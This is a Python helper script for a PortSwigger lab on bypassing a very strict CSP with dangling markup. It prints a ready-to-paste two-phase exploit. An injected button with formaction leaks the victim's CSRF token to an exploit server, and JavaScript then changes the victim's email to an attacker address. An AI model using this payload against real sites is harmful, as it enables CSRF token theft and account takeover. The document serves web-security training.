# Lab 29 — Reflected XSS protected by very strict CSP, with dangling markup attack
# PortSwigger: https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack
#
# Vulnerability: Email change form — reflected XSS, strict CSP blocks all script execution
# Aim:           Steal victim's CSRF token via form hijacking, then change their email
#
# Technique:
#   CSP is so strict no script can run at all — even injected HTML can't execute.
#   But HTML can still be injected. Key insight: the CSP has no form-action directive.
#
#   Inject a <button> with a formaction pointing to your exploit server.
#   formaction on a <button> overrides the parent form's action — standard HTML5.
#   Add formmethod="get" so the POST data (including CSRF token) moves to the URL.
#
#   Payload injected via ?email parameter:
#     foo@bar"><button formaction="https://EXPLOIT-SERVER/exploit" formmethod="get">Click me</button>
#
#   Two-phase attack via exploit server:
#     Phase 1: Redirect victim to lab page with the injected button.
#              Victim clicks → form submits to exploit server with CSRF token in URL.
#     Phase 2: Exploit server receives ?csrf=TOKEN → creates a form and changes email.
#
#   Cannot be automated — requires exploit server and victim interaction.
#
# Usage: python xss_lab29.py <url>

import sys
import urllib3
from xss_utils import banner, section, print_step, print_box

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if __name__ == "__main__":
    banner()
    section("LAB 29 — DANGLING MARKUP: STRICT CSP, FORM HIJACK + CSRF TOKEN THEFT")

    if len(sys.argv) != 2:
        print("  Usage: python xss_lab29.py <url>")
        sys.exit(1)

    url = sys.argv[1]

    exploit = """\
<script>
const labUrl    = \"""" + url + """/\";
const exploitUrl = "https://YOUR-EXPLOIT-SERVER.net/exploit";

const csrf = new URL(location).searchParams.get('csrf');

if (csrf) {
    // Phase 2: we have the token — change the email
    const form     = document.createElement('form');
    const email    = document.createElement('input');
    const token    = document.createElement('input');
    form.method    = 'post';
    form.action    = labUrl + 'my-account/change-email';
    email.name     = 'email';
    email.value    = 'hacker@evil-user.net';
    token.name     = 'csrf';
    token.value    = csrf;
    form.append(email, token);
    document.body.append(form);
    form.submit();
} else {
    // Phase 1: redirect victim to lab with injected button
    location = labUrl
        + 'my-account?email=foo%40bar%22%3E%3Cbutton+formaction='
        + exploitUrl
        + '+formmethod%3Dget%3EClick+me%3C%2Fbutton%3E';
}
</script>"""

    print("  ℹ  CSP blocks all script execution — but form-action is NOT restricted.\n")
    print("  ℹ  injected <button formaction=...> overrides the form's own action.\n")
    print("  ℹ  formmethod=get moves POST body data to the URL → CSRF token visible in logs.\n")

    print_box("EXPLOIT SERVER BODY — paste this (update both URLs)", exploit)

    print_step("Update labUrl and exploitUrl in the script above")
    print_step("Paste into exploit server Body field")
    print_step("Click 'Store', then 'Deliver exploit to victim'")
    print_step("Victim is redirected → sees 'Click me' button → clicks → CSRF leaks to exploit server")
    print_step("Script detects csrf= in URL → Phase 2 fires → email changed to hacker@evil-user.net")
    print()
    print("  ℹ  This works because form-action is missing from the CSP policy.")
    print("     Without form-action: in CSP, injected buttons can submit forms anywhere.")
